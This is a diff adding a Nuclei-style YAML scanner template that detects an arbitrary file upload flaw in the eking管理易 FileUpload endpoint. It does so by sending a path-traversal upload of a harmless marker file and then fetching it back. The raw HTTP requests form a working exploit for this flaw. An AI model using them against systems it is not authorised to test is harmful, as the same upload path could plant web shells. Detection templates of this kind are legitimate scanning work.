@@ -1,0 +1,38 @@
+id: EKing-FileUpload-upload
+
+info:
+  name: eking管理易FileUpload接口存在任意文件上传漏洞
+  author: EKing
+  severity: high
+  tags: EKing
+
+http:
+  - raw:
+      - |
+        POST /app/FileUpload.ihtm?comm_type=EKING&file_name=../../rctest25e.txt. HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
+        Content-Type: multipart/form-data; boundary=WebKitFormBoundaryHHaZAYecVOf5sfa6
+
+        --WebKitFormBoundaryHHaZAYecVOf5sfa6
+        Content-Disposition: form-data; name="uplo_file"; filename="rce.jpg"
+        
+        test159sde3a
+        --WebKitFormBoundaryHHaZAYecVOf5sfa6--
+
+      - |+
+        GET /rctest25e.txt HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body_2
+        words:
+          - 'test159sde3a'
+    matchers-condition: and
